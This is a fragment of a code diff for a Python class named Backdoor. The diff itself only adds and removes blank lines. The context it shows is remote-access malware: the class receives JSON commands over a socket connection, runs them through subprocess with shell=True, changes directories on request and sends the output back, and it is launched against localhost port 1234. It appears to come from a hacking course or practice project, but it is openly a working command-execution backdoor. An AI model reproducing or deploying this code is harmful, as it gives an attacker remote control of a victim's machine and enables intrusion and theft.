@@ -23,7 +23,6 @@ class Backdoor:
 		json_data = json.dumps(data)
 		self.connection.send(json_data)
 
-
 	def reliable_receive(self):
 		json_data = ""
 		while True:
@@ -33,10 +32,8 @@ class Backdoor:
 			except ValueError:
 				continue
 
-
 	def execute_system_commmand(self,command):
 		return subprocess.check_output(command,shell=True)
-
 
 	def change_working_directory_to(self,path):
 		os.chdir(path)
@@ -54,7 +51,6 @@ class Backdoor:
 	def run(self):
 		while True:
 			command = self.reliable_receive()
-
 			try:
 				if command[0] == "exit":
 					self.connection.close()
@@ -72,6 +68,8 @@ class Backdoor:
 			except Exception:
 				command_result = "[-] Error during command Execution"
 			self.reliable_send(command_result)
+
+
 try:
 	my_backdoor = Backdoor("localhost",1234)
 	my_backdoor.run()
